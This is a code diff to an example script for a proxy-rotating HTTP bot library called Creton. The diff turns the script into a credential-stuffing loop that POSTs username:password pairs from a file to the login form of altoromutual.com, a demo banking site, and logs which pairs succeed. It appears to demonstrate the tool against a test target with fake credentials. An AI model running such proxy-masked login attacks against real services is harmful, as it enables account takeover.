@@ -14,26 +14,38 @@
 const Creton = require('../index');
 
 let creton = new Creton({
-    proxyFilters: {"country": "PO"},
+    proxyFilters: {"country": "NZ"},
     stickySessions: true,
     debug: true
 });
 
-let httpClient = creton.createNewHTTPClient();
+let credentialHandlerFn = function () {
+    let credentials = require('./src/fakeCredentials.json').credentials;
+    let pos = 0;
 
-let credentials = require('./src/fakeCredentials.json').credentials;
+    return {
+        getNextCredentialPair() {
+            pos++;
+            return credentials[pos - 1].split(':');
+        }
+    }
+}
+
+let credentialHandler = credentialHandlerFn();
 
 let HTTPGetResponseHandler = function (err, resp, body) {
     // Check to make sure the page was loaded and there were no errors in the HTTP request
     if (err || resp.statusCode !== 200) {
         console.log("Something went wrong with this request...");
-    } else {
+    } else if (httpClient) {
 
-        let bodyString = "uid=admin&passw=admin";
+        let credentialsToTest = credentialHandler.getNextCredentialPair();
+
+        let bodyString = "uid=" + credentialsToTest[0] + "&passw=" + credentialsToTest[1];
 
         let HTTPBodyData = {
             bodyContent: bodyString,
-            bodyType : 'application/x-www-form-urlencoded'
+            bodyType: 'application/x-www-form-urlencoded'
         }
 
         httpClient.updateRequestOptionsForNextRequest("http://www.altoromutual.com/doLogin", "POST", HTTPBodyData);
@@ -48,7 +60,7 @@ let HTTPPostResponseHandler = function (err, resp, body) {
         console.log("Something went wrong with this request...");
     } else {
         // If the login is successful - the website will redirect the bot to /bank/main.jsp
-        if(resp.headers.location === "/bank/main.jsp") {
+        if (resp.headers.location === "/bank/main.jsp") {
             console.log("HooRah, the login attempt with the following credentials worked : " + this.getPreviousRequestOptions().body);
         } else {
             console.log('Uh Oh.. This login failed....');
@@ -57,6 +69,9 @@ let HTTPPostResponseHandler = function (err, resp, body) {
     }
 }
 
+
+// Setup new client
+let httpClient = creton.createNewHTTPClient();
 
 // Setup of first request
 httpClient.setOptionsForFirstRequest("http://www.altoromutual.com/login.jsp", "GET");
